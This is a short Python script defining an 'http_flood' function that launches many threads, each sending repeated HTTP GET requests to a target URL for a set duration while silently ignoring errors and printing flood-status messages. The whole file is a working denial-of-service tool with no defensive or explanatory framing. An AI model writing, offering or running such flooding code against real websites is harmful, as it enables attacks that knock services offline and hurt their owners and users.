import requests, threading, time

def http_flood(url, thread_count, duration):
    stop = time.time() + duration
    def attack():
        while time.time() < stop:
            try:
                requests.get(url, timeout=2)
            except:
                pass

    for i in range(thread_count):
        t = threading.Thread(target=attack)
        t.start()
        print(f"[HTTP FLOOD] Thread {i+1}/{thread_count}")

    print("[HTTP FLOOD] Running...")
  
